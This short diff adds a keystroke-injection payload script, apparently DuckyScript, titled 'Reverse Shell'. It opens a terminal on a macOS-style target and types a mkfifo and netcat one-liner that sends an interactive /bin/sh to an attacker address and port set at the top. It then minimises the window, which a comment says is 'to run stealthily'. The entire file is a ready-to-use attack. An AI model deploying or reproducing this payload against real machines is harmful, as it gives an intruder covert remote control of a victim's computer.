@@ -1,0 +1,18 @@
+REM Title: Reverse Shell
+REM Author: UndedInside:
+REM Description: Opens a reverse shell from the target to the attacker
+
+DEFAULT_DELAY 500
+DEFINE #LHOST 192.168.0.172
+DEFINE #LPORT 1337
+
+REM Open terminal:
+GUI SPACE
+STRING terminal
+ENTER
+
+STRING rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc #LHOST #LPORT > /tmp/f
+ENTER
+
+REM Minimise window to run stealthily
+GUI M
